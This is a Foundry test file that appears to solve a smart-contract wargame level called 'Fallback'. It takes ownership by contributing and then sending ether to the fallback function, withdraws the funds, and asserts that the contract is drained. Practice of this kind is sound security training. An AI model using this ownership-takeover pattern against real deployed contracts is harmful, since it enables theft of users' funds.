// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback target;
    address player;

    function setUp() public {
        target = new Fallback();
        player = makeAddr("player");
        vm.deal(player, 1 ether);
    }

    function attack() private {
        // contribute
        target.contribute{value: 1}();

        // fallback
        (bool ok,) = address(target).call{value: 1}("");
        assertTrue(ok);

        // confirm ownership
        assertEq(target.owner(), address(player));

        // withdraw
        target.withdraw();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        // owner should be the player
        assertEq(target.owner(), address(player), "owner should be the player");

        // balance should be drained
        assertEq(address(target).balance, 0, "balance should be drained");
    }
}
